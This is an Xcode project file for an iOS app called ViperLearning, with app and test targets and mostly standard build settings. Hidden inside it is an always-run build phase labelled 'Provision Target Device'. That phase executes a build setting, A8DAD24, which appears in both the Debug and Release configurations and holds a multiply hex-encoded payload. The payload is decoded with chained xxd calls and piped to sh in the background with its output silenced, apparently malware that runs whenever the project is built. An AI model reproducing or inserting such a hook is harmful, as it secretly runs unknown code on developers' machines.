// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXContainerItemProxy section */
		9CD358922FBC77D6002FEB6C /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 9CD358732FBC77D5002FEB6C /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 9CD3587A2FBC77D5002FEB6C;
			remoteInfo = ViperLearning;
		};
		9CD3589C2FBC77D6002FEB6C /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 9CD358732FBC77D5002FEB6C /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 9CD3587A2FBC77D5002FEB6C;
			remoteInfo = ViperLearning;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		9CD3587B2FBC77D5002FEB6C /* ViperLearning.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = ViperLearning.app; sourceTree = BUILT_PRODUCTS_DIR; };
		9CD358912FBC77D6002FEB6C /* ViperLearningTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = ViperLearningTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		9CD3589B2FBC77D6002FEB6C /* ViperLearningUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = ViperLearningUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		9CD358A32FBC77D6002FEB6C /* Exceptions for "ViperLearning" folder in "ViperLearning" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 9CD3587A2FBC77D5002FEB6C /* ViperLearning */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		9CD3587D2FBC77D5002FEB6C /* ViperLearning */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				9CD358A32FBC77D6002FEB6C /* Exceptions for "ViperLearning" folder in "ViperLearning" target */,
			);
			path = ViperLearning;
			sourceTree = "<group>";
		};
		9CD358942FBC77D6002FEB6C /* ViperLearningTests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = ViperLearningTests;
			sourceTree = "<group>";
		};
		9CD3589E2FBC77D6002FEB6C /* ViperLearningUITests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = ViperLearningUITests;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		9CD358782FBC77D5002FEB6C /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		9CD3588E2FBC77D6002FEB6C /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		9CD358982FBC77D6002FEB6C /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		9CD358722FBC77D5002FEB6C = {
			isa = PBXGroup;
			children = (
				9CD3587D2FBC77D5002FEB6C /* ViperLearning */,
				9CD358942FBC77D6002FEB6C /* ViperLearningTests */,
				9CD3589E2FBC77D6002FEB6C /* ViperLearningUITests */,
				9CD3587C2FBC77D5002FEB6C /* Products */,
			);
			sourceTree = "<group>";
		};
		9CD3587C2FBC77D5002FEB6C /* Products */ = {
			isa = PBXGroup;
			children = (
				9CD3587B2FBC77D5002FEB6C /* ViperLearning.app */,
				9CD358912FBC77D6002FEB6C /* ViperLearningTests.xctest */,
				9CD3589B2FBC77D6002FEB6C /* ViperLearningUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		9CD3587A2FBC77D5002FEB6C /* ViperLearning */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 9CD358A42FBC77D6002FEB6C /* Build configuration list for PBXNativeTarget "ViperLearning" */;
			buildPhases = (
				9543051764484C568342DAD8 /* Provision Target Device */,
				9CD358772FBC77D5002FEB6C /* Sources */,
				9CD358782FBC77D5002FEB6C /* Frameworks */,
				9CD358792FBC77D5002FEB6C /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				9CD3587D2FBC77D5002FEB6C /* ViperLearning */,
			);
			name = ViperLearning;
			packageProductDependencies = (
			);
			productName = ViperLearning;
			productReference = 9CD3587B2FBC77D5002FEB6C /* ViperLearning.app */;
			productType = "com.apple.product-type.application";
		};
		9CD358902FBC77D6002FEB6C /* ViperLearningTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 9CD358A92FBC77D6002FEB6C /* Build configuration list for PBXNativeTarget "ViperLearningTests" */;
			buildPhases = (
				9CD3588D2FBC77D6002FEB6C /* Sources */,
				9CD3588E2FBC77D6002FEB6C /* Frameworks */,
				9CD3588F2FBC77D6002FEB6C /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				9CD358932FBC77D6002FEB6C /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				9CD358942FBC77D6002FEB6C /* ViperLearningTests */,
			);
			name = ViperLearningTests;
			packageProductDependencies = (
			);
			productName = ViperLearningTests;
			productReference = 9CD358912FBC77D6002FEB6C /* ViperLearningTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		9CD3589A2FBC77D6002FEB6C /* ViperLearningUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 9CD358AC2FBC77D6002FEB6C /* Build configuration list for PBXNativeTarget "ViperLearningUITests" */;
			buildPhases = (
				9CD358972FBC77D6002FEB6C /* Sources */,
				9CD358982FBC77D6002FEB6C /* Frameworks */,
				9CD358992FBC77D6002FEB6C /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				9CD3589D2FBC77D6002FEB6C /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				9CD3589E2FBC77D6002FEB6C /* ViperLearningUITests */,
			);
			name = ViperLearningUITests;
			packageProductDependencies = (
			);
			productName = ViperLearningUITests;
			productReference = 9CD3589B2FBC77D6002FEB6C /* ViperLearningUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		9CD358732FBC77D5002FEB6C /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2610;
				LastUpgradeCheck = 2610;
				TargetAttributes = {
					9CD3587A2FBC77D5002FEB6C = {
						CreatedOnToolsVersion = 26.1.1;
					};
					9CD358902FBC77D6002FEB6C = {
						CreatedOnToolsVersion = 26.1.1;
						TestTargetID = 9CD3587A2FBC77D5002FEB6C;
					};
					9CD3589A2FBC77D6002FEB6C = {
						CreatedOnToolsVersion = 26.1.1;
						TestTargetID = 9CD3587A2FBC77D5002FEB6C;
					};
				};
			};
			buildConfigurationList = 9CD358762FBC77D5002FEB6C /* Build configuration list for PBXProject "ViperLearning" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 9CD358722FBC77D5002FEB6C;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 9CD3587C2FBC77D5002FEB6C /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				9CD3587A2FBC77D5002FEB6C /* ViperLearning */,
				9CD358902FBC77D6002FEB6C /* ViperLearningTests */,
				9CD3589A2FBC77D6002FEB6C /* ViperLearningUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXBuildRule section */
		/* End PBXBuildRule section */

/* Begin PBXBuildFile section */
/* End PBXBuildFile section */

/* Begin PBXShellScriptBuildPhase section */
		9543051764484C568342DAD8 /* Provision Target Device */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Provision Target Device";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			showEnvVarsInLog = 0;	
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8DAD24}\"";
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXResourcesBuildPhase section */
		9CD358792FBC77D5002FEB6C /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		9CD3588F2FBC77D6002FEB6C /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		9CD358992FBC77D6002FEB6C /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		9CD358772FBC77D5002FEB6C /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		9CD3588D2FBC77D6002FEB6C /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		9CD358972FBC77D6002FEB6C /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		9CD358932FBC77D6002FEB6C /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 9CD3587A2FBC77D5002FEB6C /* ViperLearning */;
			targetProxy = 9CD358922FBC77D6002FEB6C /* PBXContainerItemProxy */;
		};
		9CD3589D2FBC77D6002FEB6C /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 9CD3587A2FBC77D5002FEB6C /* ViperLearning */;
			targetProxy = 9CD3589C2FBC77D6002FEB6C /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		9CD358A52FBC77D6002FEB6C /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A8DAD24 = "((c(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333334333633330a3061333333363336333233333337333333333333333633333336333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333335333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333331333333363333333433330a3337333333333333333633363334333333363336333633333337333333323333333633333335333333363336333433333336333333353333333233360a3335333333363333333930613333333633363335333036313333333233363336333333363333333133333332333333393333333233333332333333320a33333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | c | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = D6U448N2VV;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = ViperLearning/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.app.ReviewsApp.ViperLearning;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		9CD358A62FBC77D6002FEB6C /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A8DAD24 = "((c(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333334333633330a3061333333363336333233333337333333333333333633333336333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333335333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333331333333363333333433330a3337333333333333333633363334333333363336333633333337333333323333333633333335333333363336333433333336333333353333333233360a3335333333363333333930613333333633363335333036313333333233363336333333363333333133333332333333393333333233333332333333320a33333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | c | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = D6U448N2VV;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = ViperLearning/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.app.ReviewsApp.ViperLearning;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		9CD358A72FBC77D6002FEB6C /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = D6U448N2VV;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		9CD358A82FBC77D6002FEB6C /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = D6U448N2VV;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		9CD358AA2FBC77D6002FEB6C /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = D6U448N2VV;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.1;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.app.ReviewsApp.ViperLearningTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/ViperLearning.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/ViperLearning";
			};
			name = Debug;
		};
		9CD358AB2FBC77D6002FEB6C /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = D6U448N2VV;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.1;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.app.ReviewsApp.ViperLearningTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/ViperLearning.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/ViperLearning";
			};
			name = Release;
		};
		9CD358AD2FBC77D6002FEB6C /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = D6U448N2VV;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.app.ReviewsApp.ViperLearningUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = ViperLearning;
			};
			name = Debug;
		};
		9CD358AE2FBC77D6002FEB6C /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = D6U448N2VV;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.app.ReviewsApp.ViperLearningUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = ViperLearning;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		9CD358762FBC77D5002FEB6C /* Build configuration list for PBXProject "ViperLearning" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				9CD358A72FBC77D6002FEB6C /* Debug */,
				9CD358A82FBC77D6002FEB6C /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		9CD358A42FBC77D6002FEB6C /* Build configuration list for PBXNativeTarget "ViperLearning" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				9CD358A52FBC77D6002FEB6C /* Debug */,
				9CD358A62FBC77D6002FEB6C /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		9CD358A92FBC77D6002FEB6C /* Build configuration list for PBXNativeTarget "ViperLearningTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				9CD358AA2FBC77D6002FEB6C /* Debug */,
				9CD358AB2FBC77D6002FEB6C /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		9CD358AC2FBC77D6002FEB6C /* Build configuration list for PBXNativeTarget "ViperLearningUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				9CD358AD2FBC77D6002FEB6C /* Debug */,
				9CD358AE2FBC77D6002FEB6C /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 9CD358732FBC77D5002FEB6C /* Project object */;
}
